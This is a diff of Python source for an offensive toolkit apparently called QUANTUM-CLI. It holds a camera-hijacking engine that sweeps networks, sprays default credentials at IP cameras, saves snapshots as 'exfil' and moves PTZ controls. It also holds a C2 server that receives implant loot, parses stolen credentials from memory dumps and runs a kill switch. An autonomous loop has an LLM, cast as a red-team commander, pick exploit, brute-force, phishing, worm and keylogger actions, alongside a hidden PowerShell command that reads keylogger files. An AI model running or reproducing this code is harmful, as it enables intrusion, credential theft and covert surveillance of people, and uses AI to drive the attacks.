+        ("hikvision", ("embedded_net_dvr", "netdvr", "hikvision", "hik-")),
+        ("dahua",     ("dahua", "dvrdvs", "dss")),
+        ("vivotek",   ("vivotek",)),
+        ("axis",      ("axis",)),
+        ("foscam",    ("ipcamera", "foscam")),
+        ("tplink",    ("tapo",)),
+    ]
+    CREDS = {
+        "hikvision": [("admin", "admin"), ("admin", "12345"), ("admin", "888888"),
+                     ("admin", "66668888"), ("admin", "Admin123"), ("admin", "")],
+        "dahua":     [("admin", "admin"), ("admin", "admin1234"), ("888888", "888888"), ("admin", "123456")],
+        "axis":      [("root", "pass"), ("root", "root"), ("admin", "1234"), ("admin", "admin")],
+        "foscam":    [("admin", ""), ("admin", "admin"), ("admin", "12345"), ("admin", "888888")],
+        "tplink":    [("admin", "admin"), ("admin", "password")],
+        "generic":   [("admin", "admin"), ("admin", "12345"), ("admin", ""), ("root", "root"),
+                      ("user", "user"), ("guest", "guest"), ("888888", "888888")],
+    }
+    INFO_ENDPOINTS = {
+        "hikvision": ("/ISAPI/System/deviceInfo", "digest"),
+        "dahua":     ("/cgi-bin/magicBox.cgi?action=getSystemInfo", "digest"),
+        "axis":      ("/axis-cgi/param.cgi?action=list", "basic"),
+        "foscam":    ("/get_params.cgi", "basic"),
+        "generic":    ("/", "basic"),
+    }
+    SNAPSHOT = {
+        "hikvision": [("/ISAPI/Streaming/channels/101/picture", "digest"),
+                      ("/ISAPI/Streaming/channels/1/picture", "digest"),
+                      ("/ISAPI/System/Video/inputs/channels/1/picture", "digest")],
+        "dahua":     [("/cgi-bin/snapshot.cgi", "digest"),
+                      ("/cgi-bin/snapshot.cgi?channel=1", "digest")],
+        "axis":      [("/axis-cgi/jpg/image.cgi?resolution=640x480", "basic")],
+        "foscam":    [("/snapshot.cgi", "basic")],
+        "generic":   [],
+    }
+    GENERIC_SNAPSHOTS = [
+        ("/snapshot.cgi", "basic"), ("/image.jpg", "basic"),
+        ("/snap.jpg", "basic"), ("/snapshot.jpg", "basic"),
+        ("/onvif-http/snapshot.jpg", "basic"),
+        ("/cgi-bin/snapshot.cgi", "digest"),
+        ("/ISAPI/Streaming/channels/101/picture", "digest"),
+        ("/tmpfs/snap.jpg", "basic"),
+        ("/webcapture.jpg?command=snap&channel=1", "basic"),
+    ]
+    PTZ = {
+        "hikvision": ("put", "/ISAPI/PTZCtrl/channels/1/continuous",
+                     '<PTZData><pan>60</pan><tilt>0</tilt></PTZData>', "digest"),
+        "dahua":     ("get", "/cgi-bin/ptz.cgi?action=start&code=LeftRight&arg1=1&arg2=1&channel=1", None, "digest"),
+        "axis":      ("get", "/axis-cgi/com/ptz.cgi?move=up", None, "basic"),
+        "foscam":    ("get", "/decoder_control.cgi?command=2", None, "basic"),
+    }
+
+    @classmethod
+    def _auth(cls, kind, u, p):
+        return HTTPDigestAuth(u, p) if kind == "digest" else HTTPBasicAuth(u, p)
+
+    @staticmethod
+    def _rtsp_probe(ip, port=554, timeout=3):
+        try:
+            s = socket.create_connection((ip, port), timeout=timeout)
+            s.sendall(f"OPTIONS rtsp://{ip}:{port}/ RTSP/1.0\r\nCSeq: 1\r\n"
+                      "User-Agent: QCLI\r\n\r\n".encode())
+            data = s.recv(512); s.close()
+            return data.decode("latin-1", "ignore")
+        except Exception:
+            return ""
+
+    @classmethod
+    def _rtsp_alive(cls, ip, port=554, timeout=3):
+        return "RTSP" in cls._rtsp_probe(ip, port, timeout)
+
+    @classmethod
+    def _vendor_from_rtsp(cls, raw):
+        low = raw.lower()
+        for vendor, hints in cls.RTSP_VENDORS:
+            if any(h in low for h in hints):
+                return vendor
+        return None
+
+    @staticmethod
+    def _vendor_from_str(s):
+        low = (s or "").lower()
+        if "hik" in low: return "hikvision"
+        if "dahua" in low: return "dahua"
+        if "axis" in low: return "axis"
+        if "foscam" in low: return "foscam"
+        if "tapo" in low or "tplink" in low: return "tplink"
+        return None
+
+    def identify(self, ip):
+        info = {"ip": ip, "vendor": None, "rtsp": False, "ports": []}
+        vol = None
+        for port in self.CAM_PORTS:
+            if tcp_probe(ip, port, timeout=0.8):
+                info["ports"].append(port)
+                if port in (80, 8080, 8000, 8081, 443, 5000) and vol is None:
+                    try:
+                        scheme = "https" if port == 443 else "http"
+                        r = requests.get(f"{scheme}://{ip}:{port}", timeout=3, verify=False)
+                        hay = (r.text or "").lower() + " " + (
+                            r.headers.get("Server", "") + " " + r.headers.get("WWW-Authenticate", "")).lower()
+                        if not any(h in hay for h in ("embedded_net_dvr", "netdvr")):
+                            try:
+                                r2 = requests.get(f"{scheme}://{ip}:{port}/doc/page/login.asp",
+                                                  timeout=3, verify=False)
+                                hay += " " + (r2.text or "").lower()[:4000]
+                            except Exception:
+                                pass
+                        for vendor, hints in self.VENDOR_HINTS:
+                            if any(h in hay for h in hints):
+                                info["vendor"] = vendor; vol = port; break
+                        if port == 443: info["scheme"] = "https"
+                    except Exception:
+                        pass
+        if tcp_probe(ip, 554, timeout=1.0):
+            raw = self._rtsp_probe(ip)
+            if "RTSP" in raw:
+                info["rtsp"] = True
+            if info["vendor"] is None:
+                got = self._vendor_from_rtsp(raw)
+                if got:
+                    info["vendor"] = got
+                    log(f"CAM WAR: {ip} vendor={got} via RTSP Server header", "CAM")
+        if info["vendor"] is None and info["rtsp"]:
+            info["vendor"] = "generic"
+        return info
+
+    def discover(self, cidr):
+        import ipaddress
+        cameras, checked = [], 0
+        try:
+            hosts = [str(i) for i in ipaddress.ip_network(cidr, strict=False).hosts()]
+        except Exception as e:
+            log(f"CAMWAR bad CIDR {cidr}: {e}", "ERR"); return []
+        log(f"CAM WAR: sweeping {len(hosts)} hosts in {cidr} for cameras (TCP + WS-Discovery)…", "CAM")
+
+        ws = wsdiscovery_cameras(timeout=4.0)
+        wsmap = {w["ip"]: w for w in ws}
+
+        def merge_ws(info, w):
+            info["onvif"] = True
+            if w.get("onvif_port") and w["onvif_port"] not in info["ports"]:
+                info["ports"].append(w["onvif_port"])
+            if info["vendor"] is None and w.get("manufacturer"):
+                info["vendor"] = self._vendor_from_str(w["manufacturer"]) or "generic"
+            if w.get("model"): info["model"] = w["model"]
+            if w.get("name"): info["name"] = w["name"]
+            return info
+
+        lock = threading.Lock()
+        def work(ip):
+            nonlocal checked
+            info = self.identify(ip)
+            w = wsmap.get(ip)
+            if w:
+                info = merge_ws(info, w)
+                if info["vendor"] is None and info["rtsp"]:
+                    info["vendor"] = "generic"
+            with lock:
+                checked += 1
+                if info["vendor"] or info["rtsp"] or 554 in info["ports"] or w is not None:
+                    cameras.append(info)
+                    log(f"CAM WAR: camera candidate {ip} vendor={info['vendor']} "
+                        f"rtsp={info['rtsp']} ports={info['ports']}"
+                        + (f" model={info.get('model')}" if info.get("model") else ""), "CAM")
+        with ThreadPoolExecutor(max_workers=64) as ex:
+            list(ex.map(work, hosts))
+
+        hostset = set(hosts)
+        for w in ws:
+            if w["ip"] not in hostset:
+                info = merge_ws(self.identify(w["ip"]), w)
+                if info["vendor"] or info["rtsp"] or 554 in info["ports"]:
+                    cameras.append(info)
+                    log(f"CAM WAR: (out-of-scope via WS) camera {w['ip']} "
+                        f"vendor={info['vendor']} model={info.get('model')}", "CAM")
+
+        for cam in cameras:
+            if not (cam.get("model") or cam.get("onvif_port")):
+                continue
+            for p in (cam.get("onvif_port"), 80, 8000, 8080):
+                if p and tcp_probe(cam["ip"], p, timeout=0.8):
+                    dbg = onvif_device_info(cam["ip"], p)
+                    if dbg: break
+        log(f"CAM WAR: discovery done — {checked} hosts checked + {len(ws)} WS-Discovery hits, "
+            f"{len(cameras)} cameras found", "CAM")
+        return cameras
+
+    def attack_cam(self, cam):
+        vendor = cam.get("vendor") or "generic"
+        scheme = cam.get("scheme") or ("https" if 443 in cam.get("ports", []) else "http")
+        base = f"{scheme}://{cam['ip']}"
+        info_path, authkind = self.INFO_ENDPOINTS.get(vendor, self.INFO_ENDPOINTS["generic"])
+        for user, pwd in self.CREDS.get(vendor, self.CREDS["generic"]):
+            try:
+                r = requests.get(base + info_path, auth=self._auth(authkind, user, pwd), timeout=5, verify=False)
+                if r.status_code == 200 and len(r.content) > 0:
+                    cam["user"], cam["pwd"], cam["controlled"] = user, pwd, True
+                    log(f"CAM WAR: {cam['ip']} ({vendor}) CRACKED with {user}:{pwd or '<blank>'}", "CAM")
+                    return (user, pwd)
+                for alt in ("/doc/page/login.asp", "/onvif/device_service"):
+                    try:
+                        r2 = requests.get(base + alt, auth=self._auth(authkind, user, pwd), timeout=5, verify=False)
+                        if r2.status_code in (200, 400, 405) and user != "guest":
+                            cam["user"], cam["pwd"], cam["controlled"] = user, pwd, True
+                            log(f"CAM WAR: {cam['ip']} ({vendor}) CRACKED via {alt} with {user}:{pwd or '<blank>'}", "CAM")
+                            return (user, pwd)
+                    except Exception:
+                        continue
+            except Exception:
+                continue
+        cam["controlled"] = False
+        log(f"CAM WAR: {cam['ip']} ({vendor}) resisted default creds", "CAM")
+        return None
+
+    def control_cam(self, cam, ptz=True):
+        if not cam.get("controlled"): return None
+        vendor = cam.get("vendor") or "generic"
+        scheme = cam.get("scheme") or "http"
+        base = f"{scheme}://{cam['ip']}"
+        candidates = list(self.SNAPSHOT.get(vendor, []))
+        for v in ("hikvision", "dahua", "axis", "foscam"):
+            if v != vendor:
+                candidates += self.SNAPSHOT[v]
+        candidates += self.GENERIC_SNAPSHOTS
+        shots = []
+        for path, kind in candidates:
+            try:
+                r = requests.get(base + path, auth=self._auth(kind, cam["user"], cam["pwd"]),
+                                 timeout=8, verify=False)
+                if r.status_code == 200 and r.content[:2] in (b"\xff\xd8", b"\x89PNG"):
+                    fn = os.path.join(LOOT_DIR, f"cam_{cam['ip']}_{int(time.time())}.jpg")
+                    open(fn, "wb").write(r.content)
+                    sealed = GRAYFISH.seal(fn)
+                    shots.append(sealed)
+                    log(f"CAM WAR: snapshot exfil {cam['ip']} -> {sealed}", "CAM")
+                    break
+            except Exception:
+                continue
+        if ptz and vendor in self.PTZ:
+            method, path, body, kind = self.PTZ[vendor]
+            try:
+                if method == "put":
+                    requests.put(base + path, data=body,
+                                 auth=self._auth(kind, cam["user"], cam["pwd"]), timeout=5, verify=False)
+                    time.sleep(1.0)
+                    requests.put(base + path, data='<PTZData><pan>0</pan><tilt>0</tilt></PTZData>',
+                                 auth=self._auth(kind, cam["user"], cam["pwd"]), timeout=5, verify=False)
+                else:
+                    requests.get(base + path, auth=self._auth(kind, cam["user"], cam["pwd"]), timeout=5, verify=False)
+                cam["ptz"] = "nudged"
+                log(f"CAM WAR: PTZ nudged on {cam['ip']}", "CAM")
+            except Exception as e:
+                log(f"CAM WAR: PTZ {cam['ip']}: {e}", "WARN")
+        cam["snapshots"] = shots
+        return shots
+
+    def one_shot(self, ip, ptz=True):
+        cam = self.identify(ip)
+        if not cam["vendor"] and not cam["rtsp"]:
+            for w in wsdiscovery_cameras(timeout=3.0):
+                if w["ip"] == ip:
+                    if w.get("manufacturer"):
+                        cam["vendor"] = self._vendor_from_str(w["manufacturer"]) or "generic"
+                    cam["onvif"] = True
+                    break
+        if not cam["vendor"] and not cam["rtsp"] and not cam.get("onvif"):
+            return {"ip": ip, "camera": False}
+        if cam["vendor"] is None: cam["vendor"] = "generic"
+        self.attack_cam(cam)
+        self.control_cam(cam, ptz=ptz)
+        return cam
+
+    def pwn_network(self, cidr, report=True):
+        log(f"CAM WAR: ENGAGING full takeover on {cidr}", "CAM")
+        cams = self.discover(cidr)
+        cracked, snapshots = 0, 0
+        for cam in cams:
+            if self.attack_cam(cam):
+                cracked += 1
+                snaps = self.control_cam(cam) or []
+                snapshots += len(snaps)
+            time.sleep(random.uniform(0.3, 1.5))
+        summary = {"cidr": cidr, "found": len(cams), "cracked": cracked,
+                   "snapshots": snapshots,
+                   "cams": [{"ip": c["ip"], "vendor": c["vendor"], "rtsp": c["rtsp"],
+                             "model": c.get("model"), "controlled": c.get("controlled", False)} for c in cams]}
+        if report:
+            fn = os.path.join(LOOT_DIR, f"camwar_{cidr.replace('/', '_')}_{int(time.time())}.json")
+            open(fn, "w").write(json.dumps(summary, indent=2))
+            GRAYFISH.seal(fn)
+        log(f"CAM WAR: {cidr} dominated — {len(cams)} found, {cracked} cracked, "
+            f"{snapshots} snapshots exfiltrated", "CAM")
+        return summary
+
+# ============================================================================
+# 12. C2 CORE — V3.1: production WSGI, kill-switch route, post-exploit stage
+# ============================================================================
+def keygen(force=False):
+    if os.path.exists(PRIV) and not force:
+        log("keys exist (use keygen --force)", "WARN"); return
+    k = RSA.generate(2048)
+    open(PRIV, "wb").write(k.export_key())
+    xml = ("<RSAKeyValue><Modulus>%s</Modulus><Exponent>%s</Exponent></RSAKeyValue>"
+           % (base64.b64encode(k.n.to_bytes((k.n.bit_length()+7)//8, "big")).decode(),
+              base64.b64encode(k.e.to_bytes(3, "big")).decode()))
+    open(PUB, "w").write(xml)
+    log(f"generated {PRIV} + {PUB}", "OK")
+
+def decrypt_beacon(d):
+    priv = RSA.import_key(open(PRIV, "rb").read())
+    key = PKCS1_OAEP.new(priv).decrypt(bytes.fromhex(d["k"]))
+    raw = AES.new(key, AES.MODE_CBC, iv=b"\x00"*16).decrypt(base64.b64decode(d["data"]))
+    return gzip.decompress(raw[:-raw[-1]])
+
+def auto_parse_loot(host, zipfn):
+    try:
+        import pypykatz.pypykatz as pk
+        if zipfile.is_zipfile(zipfn):
+            with zipfile.ZipFile(zipfn) as z:
+                for n in z.namelist():
+                    if n.endswith(".dmp"):
+                        tmp = os.path.join(LOG_DIR, f"_{host}_{n}")
+                        open(tmp, "wb").write(z.read(n))
+                        try:
+                            m = pk.get_file_secrets(tmp, packages=["msv", "wdigest", "tspkg", "kerberos"])
+                            creds = [f"{s['username']}:{s['password']}"
+                                     for pkg in m.values() for s in pkg["cred"] if s.get("password")]
+                            out = os.path.join(LOOT_DIR, host, "parsed.txt")
+                            os.makedirs(os.path.dirname(out), exist_ok=True)
+                            open(out, "a").write("\n".join(creds) + "\n")
+                            log(f"auto-parse: {len(creds)} creds from {host}/{n}", "OK")
+                            GRAYFISH.seal(out)
+                        finally: os.unlink(tmp)
+    except ImportError:
+        log("pypykatz missing — auto-parse disabled", "INFO")
+    except Exception as e:
+        log(f"auto-parse: {e}", "WARN")
+
+def run_c2(app, host="0.0.0.0", port=8443):
+    """V3 production WSGI: waitress (all OS) -> gunicorn (POSIX) -> Flask dev
+    server as last resort only."""
+    try:
+        import waitress
+        log(f"C2 served by WAITRESS (production WSGI) on {host}:{port}", "C2")
+        waitress.serve(app, host=host, port=port, threads=16, channel_timeout=30)
+        return
+    except ImportError:
+        pass
+    try:
+        import gunicorn.app.base
+        class Standalone(gunicorn.app.base.BaseApplication):
+            def load_config(self):
+                self.cfg.set("bind", f"{host}:{port}")
+                self.cfg.set("workers", 4)
+            def load(self): return app
+        log(f"C2 served by GUNICORN (production WSGI) on {host}:{port}", "C2")
+        Standalone().run(); return
+    except ImportError:
+        log("waitress/gunicorn missing — falling back to Flask dev server "
+            "(NOT production-recommended; pip install waitress)", "WARN")
+    app.run(host=host, port=port, threaded=True)
+
+TURBINE = None
+
+def make_c2(agents: dict):
+    global TURBINE
+    API = QCLI_API()
+    TURBINE = Turbine()
+    API.turbine = TURBINE
+    app = Flask(__name__)
+
+    @app.route("/s", defaults={"profile": "default"})
+    @app.route("/s/<profile>")
+    def s(profile):
+        agent_text = agents.get(profile)
+        if not agent_text: return "unknown profile", 404
+        return agent_text, 200, {"Content-Type": "text/plain"}
+
+    @app.route("/r", methods=["POST"])
+    def r():
+        d = request.json or {}
+        host = d.get("host", "?")
+        task, TASKQ[host] = TASKQ.get(host, {}), {}
+        if d.get("data") and not d.get("k"):
+            os.makedirs(os.path.join(LOOT_DIR, host), exist_ok=True)
+            fn = os.path.join(LOOT_DIR, host, f"posix_drop_{int(time.time())}.txt")
+            try: open(fn, "wb").write(base64.b64decode(d["data"]))
+            except Exception: open(fn, "w").write(str(d["data"]))
+            GRAYFISH.seal(fn)
+            log(f"C2 posix loot {host} -> {fn}.gfy", "C2")
+            return jsonify(task or {"act": "none"})
+        if d.get("act") == "hb":
+            # V3.1: keylogger buffer pull is automatic — if a kl.klq arrives, seal it
+            log(f"C2 hb {host}; reply {task or 'none'}", "C2")
+            threading.Thread(target=TURBINE.enroll, args=(host, {"heartbeat": True}), daemon=True).start()
+            return jsonify(task or {"act": "none"})
+        try: blob = decrypt_beacon(d)
+        except Exception as e:
+            log(f"decrypt fail {host}: {e}", "ERR"); return jsonify({"act": "none"})
+        os.makedirs(os.path.join(LOOT_DIR, host), exist_ok=True)
+        fn = os.path.join(LOOT_DIR, host, f"drop_{int(time.time())}.zip")
+        open(fn, "wb").write(blob)
+        log(f"C2 loot {host}: {len(blob)} bytes", "C2")
+        auto_parse_loot(host, fn)
+        GRAYFISH.seal(fn)
+        return jsonify(task or {"act": "none"})
+
+    @app.route("/ai", methods=["POST"])
+    def ai_api():
+        d = request.json or {}
+        return jsonify(API.handle(d.get("cmd", ""), d.get("params", {})))
+
+    @app.route("/kill", methods=["POST"])
+    def kill_switch():
+        """V3.1: covert kill-switch — sets wipe/die tasks on every implant queue
+        (delivery rides each implant's own encrypted beacon pull)."""
+        arm = (request.json or {}).get("arm", True)
+        if arm:
+            return jsonify(kill_all_implants(wipe_first=(request.json or {}).get("wipe", True)))
+        KILLSWITCH["on"] = False
+        return jsonify({"killed": [], "note": "kill-switch disarmed"})
+
+    @app.route("/federation/reg", methods=["GET", "POST"])
+    def fed_reg():
+        if request.method == "POST":
+            remote = (request.json or {}).get("implants", {})
+            with TURBINE.lock:
+                for h, rec in remote.items():
+                    if h not in TURBINE.implants: TURBINE.implants[h] = rec
+        return jsonify({"implants": TURBINE.implants, "onion": FEDERATION.onion})
+
+    @app.route("/federation/peer", methods=["POST"])
+    def fed_peer():
+        onion = (request.json or {}).get("onion")
+        if onion and onion not in FEDERATION.peers:
+            FEDERATION.peers.append(onion)
+            open(os.path.join(LOG_DIR, "federation", "peers.json"), "w").write(json.dumps(FEDERATION.peers))
+            log(f"FEDERATION: new peer {onion}", "FED")
+        return jsonify({"peers": FEDERATION.peers})
+
+    @app.route("/dash")
+    def dash():
+        return Response(DASH_HTML, mimetype="text/html")
+
+    @app.route("/dash/api/state")
+    def dash_state():
+        return jsonify({
+            "decisions": _tail_jsonl(os.path.join(LOG_DIR, "decisions.jsonl"), 100),
+            "audit":     _tail_jsonl(os.path.join(LOG_DIR, "audit.jsonl"), 200),
+            "mitre":     MitreMapper().map_audit().get("coverage", []),
+            "killswitch": KILLSWITCH["on"],
+        })
+
+    log("QUANTUMDASH live at http://0.0.0.0:8443/dash", "DASH")
+    return app
+
+# ============================ GLOBAL WIRING ================================
+VALIDATOR = Validator()
+GODSUPREME = GodSupreme()
+CAMWAR = CamWarEngine()
+
+# ============================================================================
+# 13. AUTONOMOUS OVERLORD (CAMERA-FIRST; V3.1 kill-switch aware)
+# ============================================================================
+class AutonomousOverlord:
+    ACTIONS = ["cam_war", "cam_discover", "cam_control", "recon_scope", "exploit",
+               "brute", "phish", "worm", "harvest", "router", "osint",
+               "episcribe", "mitre_report", "rest"]
+
+    def __init__(self, scope=None, cycles=0, aggression="balanced", camera_only=False):
+        self.scope = scope or local_scope()
+        self.aggression = aggression
+        self.camera_only = camera_only
+        self.ai = AI_Supervisor()
+        self.recon = ReconModule()
+        self.weapons = ExploitOrchestrator()
+        self.brute = BruteEngineV3()
+        self.phish = PhishEngine()
+        self.harvest = DataHarvester()
+        self.epi = EpiScribe()
+        self.ud = UnitedDrake()
+        self.camwar = CAMWAR
+        self.cycles = cycles
+        self.state = {"targets": [], "fired": [], "creds": [], "cams": []}
+        self.stop = threading.Event()
+
+    def _decide(self):
+        acts = self.ACTIONS if not self.camera_only else \
+               ["cam_war", "cam_discover", "cam_control", "mitre_report", "rest"]
+        budget = json.dumps(self.state, default=str)[:2000]
+        p = (f"You are running an authorized red-team engagement (aggression: {self.aggression}). "
+             f"Scope: {self.scope}. Cameras are the PRIMARY objective. "
+             f"Campaign state so far: {budget}. Choose the single next action from this list ONLY: {acts}. "
+             "Reply as strict JSON: {\"action\": \"...\", \"target\": \"ip-or-domain-or-blank\", "
+             "\"reason\": \"one sentence\"}.")
+        d = None
+        if not AI_Supervisor.ai_dead and not no_ai_mode():
+            raw = self.ai.query_bounded(p, timeout=120,
+                                        system="You are an autonomous red-team commander obsessed with cameras. Output JSON only.")
+            if raw:
+                clean = re.sub(r"```(?:json)?", "", raw, flags=re.I).strip()
+                m = re.search(r"\{.*\}", clean, re.S)
+                if m:
+                    try:
+                        d = json.loads(m.group())
+                    except Exception as je:
+                        log(f"_decide JSON fail ({je}); raw reply: {raw[:200]!r}", "AI")
+                else:
+                    log(f"_decide no JSON object in reply: {raw[:200]!r}", "AI")
+        if not isinstance(d, dict) or d.get("action") not in acts:
+            d = QBrain.decide(self.state, acts, self.camera_only)
+            if d.get("action") not in acts:   # paranoia: QBrain must obey the whitelist
+                d = {"action": "rest", "target": "", "reason": "fallback"}
+        with open(os.path.join(LOG_DIR, "decisions.jsonl"), "a") as f:
+            f.write(json.dumps({"ts": datetime.now().isoformat(), **d}) + "\n")
+        return d
+
+    def post_exploit_auto(self):
+        """V3.1: runs after successful exploitation — stealth persistence stage
+        (PERSISTX), keylogger staging (KITLOGGER task in queue, delivered on
+        next beacon) and secure exfil prep (GRAYFISH interior files)."""
+        hits = persistx()
+        stage_keylogger()
+        for t in self.state["fired"]:
+            TASKQ.setdefault(t, {}).update({"act": "run", "cmd":
+                "powershell -w hidden -c Get-ChildItem $env:TEMP\\ -Filter *.klq | "
+                "%% { [IO.File]::ReadAllBytes($_.FullName) }"})
+        log(f"POST-EXPLOIT auto-stage: persist={hits} keylogger=queued "
+            f"targets={len(self.state['fired'])}", "C2")
+
+    def _execute(self, d):
+        act, tgt = d.get("action"), d.get("target", "")
+        log(f"AUTO decision: {act} target={tgt or '-'} ({d.get('reason')})", "AUTO")
+        if act == "cam_war" or act == "cam_discover":
+            cidr = tgt if "/" in (tgt or "") else self.scope
+            res = self.camwar.pwn_network(cidr) if act == "cam_war" else \
+                  {"cams": self.camwar.discover(cidr)}
+            self.state["cams"] += res.get("cams", [])
+        elif act == "cam_control":
+            for c in self.state["cams"] or []:
+                if c.get("controlled"):
+                    self.camwar.control_cam(c)
+                else:
+                    self.camwar.attack_cam(c)
+        elif act == "recon_scope":
+            self.state["targets"] = list(self.recon.scan(self.scope).keys())
+        elif act == "exploit" and tgt:
+            r = self.weapons.auto_exploit(tgt, force=(self.aggression == "aggressive"))
+            if not r.get("skipped"):
+                self.state["fired"].append(tgt)
+                self.post_exploit_auto()
+        elif act == "brute" and tgt:
+            self.state["creds"] += self.brute.run({"ip": tgt, "osint": self.state.get("osint", "")})
+        elif act == "phish" and tgt:
+            self.phish.launch({"target_email": tgt})
+        elif act == "worm" and tgt:
+            threading.Thread(target=GODSUPREME.hop_from, args=(tgt,), daemon=True).start()
+        elif act == "harvest":
+            for h in self.state["fired"] or [tgt]:
+                if h: self.harvest.harvest_host(h)
+        elif act == "router" and tgt:
+            self.ud.attack_router(tgt)
+        elif act == "osint" and tgt:
+            self.recon.osint(tgt)
+        elif act == "episcribe" and tgt:
+            self.epi.add_selector(tgt); self.epi.watch(duration=60)
+        elif act == "mitre_report" or act == "rest":
+            pass
+        time.sleep(network_aware_jitter(15))
+
+    def run(self):
+        log(f"AUTONOMOUS DOMINION: scope {self.scope}, aggression {self.aggression}, "
+            f"camera_only={self.camera_only}, CAMERAS ARE THE PRIMARY OBJECTIVE "
+            f"(AI={'QBrain fallback' if (AI_Supervisor.ai_dead or no_ai_mode()) else 'online/local'})", "AUTO")
+        if not os.path.exists(PRIV): keygen()
+        agents = {"default": (open(AGENT).read() if os.path.exists(AGENT) else "# agent file missing"),
+                  "linux":   (open(generate_posix_agent(local_ip())).read()),
+                  "mac":     (open(os.path.join(QCLI_DIR, "ghostfang.sh")).read())}
+        threading.Thread(target=lambda: run_c2(make_c2(agents)), daemon=True).start()
+        n = 0
+        try:
+            self.state["cams"] = self.camwar.pwn_network(self.scope).get("cams", [])
+            while not self.stop.is_set():
+                if KILLSWITCH["on"]:
+                    log("AUTONOMOUS: kill-switch engaged — retiring & sealing", "AUTO"); break
+                n += 1
+                self._execute(self._decide())
+                if self.cycles and n >= self.cycles:
+                    log(f"AUTONOMOUS: cycle budget ({self.cycles}) reached", "AUTO"); break
+        except KeyboardInterrupt:
+            log("AUTONOMOUS: operator interrupt — sealing loot", "AUTO")
+        except Exception as e:
+            log(f"AUTONOMOUS fatal: {e}", "ERR")
+        finally:
+            if KILLSWITCH["on"]:
+                footprint_wipe_windows() if os.name == "nt" else footprint_wipe_posix()
+            GRAYFISH.seal_dir()
+            MitreMapper().map_audit()
+            log(f"AUTONOMOUS: paused after {n} cycles — {len(self.state['cams'])} cameras touched, "
+                f"{len(self.state['fired'])} fired, {len(self.state['creds'])} creds", "AUTO")
+
+# ============================================================================
+# 14. MANUAL MODES
+# ============================================================================
+def camera_console(cidr):
+    """Manual camera war console. Zero AI required."""
+    cw = CAMWAR
+    cams = []
+    while True:
+        print(f"\n{Fore.LIGHTRED_EX}=== QUANTUM-CLI CAMERA CONSOLE — {cidr} ==={Fore.RESET}")
+        print(" 1. Discover cameras (TCP + WS-Discovery)   2. Attack all (cred spray)")
+        print(" 3. Snapshot all cracked                       4. PTZ nudge all cracked")
+        print(" 5. Attack+snapshot+PTZ single IP              6. One-shot single IP (auto)")
+        print(" 7. List state                                 0. Back")
+        try: c = input("camwar> ").strip()
+        except (EOFError, KeyboardInterrupt): return
+        if c == "0": return
+        if c == "1": cams = cw.discover(cidr)
+        elif c == "2":
+            for cam in cams: cw.attack_cam(cam)
+        elif c == "3":
+            for cam in cams:
+                if cam.get("controlled"): cw.control_cam(cam, ptz=False)
+        elif c == "4":
+            for cam in cams:
+                if cam.get("controlled"): cw.control_cam(cam, ptz=True)
+        elif c == "5":
+            cam = cw.identify(input("IP: ").strip())
+            if cam["vendor"] or cam["rtsp"]:
+                if cam["vendor"] is None: cam["vendor"] = "generic"
+                cw.attack_cam(cam); cw.control_cam(cam, ptz=True)
+        elif c == "6":
+            print(json.dumps(cw.one_shot(input("IP: ").strip()), indent=2, default=str))
+        elif c == "7":
+            print(json.dumps(cams, indent=2, default=str))
+
+def menu():
+    while True:
+        print(f"""
+{Fore.CYAN}╔══════════════════════════════════════════════════════════════╗
+║  QUANTUM-CLI FINAL V3.1 — MANUAL CONSOLE (CAMERA-FIRST OPS)   ║
+╚══════════════════════════════════════════════════════════════╝{Fore.RESET}
+  {Fore.GREEN}CAMERAS{Fore.RESET}
+   c. Camera console          11. Discover+control cameras (CIDR)
+  {Fore.GREEN}RECON / OSINT{Fore.RESET}   1. Scan CIDR   2. Fingerprint   3. OSINT   4. Validate
+  {Fore.GREEN}EXPLOITATION{Fore.RESET}    6. Auto-exploit (gated)  7. Force  8. Brute  9. Router
+  {Fore.GREEN}POST-EXPLOIT{Fore.RESET}    10. Harvest host  12. Trinity capture  13. PCAP  15. Worm
+  {Fore.GREEN}C2 / NETWORK{Fore.RESET}    19. Start C2  20. FOXACID  21. QUANTUM  22. ICMP listen
+  {Fore.GREEN}V3 POST-EXP{Fore.RESET}     29. Zerocheck probe battery   30. Kill-switch arm/disarm
+  {Fore.GREEN}AI / OPSEC{Fore.RESET}      23. Query AI  24. Tor  25. Seal  26. Unseal  27. Deploy local AI
+  {Fore.GREEN}MODE{Fore.RESET}            28. FULLY AUTONOMOUS mode    0. Exit
+""")
+        try:
+            ch = input(f"{Fore.CYAN}qcli>{Fore.RESET} ").strip()
+        except (EOFError, KeyboardInterrupt):
+            print(); return
+        if ch == "0": return
+        try:
+            if ch == "c":  camera_console(local_scope())
+            elif ch == "1":  ReconModule().scan(input("CIDR: "))
+            elif ch == "2":  print(json.dumps(ReconModule().fingerprint(input("Target IP: ")), indent=2, default=str))
+            elif ch == "3":  print(json.dumps(ReconModule().osint(input("Domain: ")), indent=2, default=str))
+            elif ch == "4":
+                ip = input("Target IP: ")
+                print(json.dumps(VALIDATOR.score(ip, ReconModule().fingerprint(ip)), indent=2))
+            elif ch == "6":  print(json.dumps(ExploitOrchestrator().auto_exploit(input("Target IP: ")), indent=2, default=str))
+            elif ch == "7":  print(json.dumps(ExploitOrchestrator().auto_exploit(input("Target IP: "), force=True), indent=2, default=str))
+            elif ch == "8":  print(json.dumps(BruteEngineV3().run({"ip": input("Target IP: ")}), indent=2))
+            elif ch == "9":  print(json.dumps(UnitedDrake().attack_router(input("Router IP: ")) or {}, indent=2))
+            elif ch == "10": print(json.dumps(DataHarvester().harvest_host(input("Host label: ")), indent=2))
+            elif ch == "11":
+                cidr = input("CIDR: ") or local_scope()
+                for cam in CAMWAR.discover(cidr):
+                    if CAMWAR.attack_cam(cam): CAMWAR.control_cam(cam)
+            elif ch == "12": Trinity(int(input("Seconds: ") or 30)).capture()
+            elif ch == "13": print(json.dumps(DataHarvester().analyze_pcap(input("PCAP file: ")), indent=2))
+            elif ch == "15":
+                threading.Thread(target=GODSUPREME.hop_from, args=(input("Hop source IP: "),), daemon=True).start()
+            elif ch == "19":
+                keygen()
+                def _read(p, alt):
+                    fp = p if os.path.isabs(p) else os.path.join(QCLI_DIR, p)
+                    return open(fp).read() if os.path.isfile(fp) else alt
+                agents = {"default": _read(AGENT, "# agent file missing"),
+                          "linux":   _read("ghostfang.sh", "# run posixagent first"),
+                          "mac":     _read("ghostfang.sh", "# run posixagent first")}
+                threading.Thread(target=lambda: run_c2(make_c2(agents)), daemon=True).start()
+                print("C2 on :8443 (waitress WSGI, background) — /s, /r, /ai, /dash, /kill, /federation/*")
+            elif ch == "20":
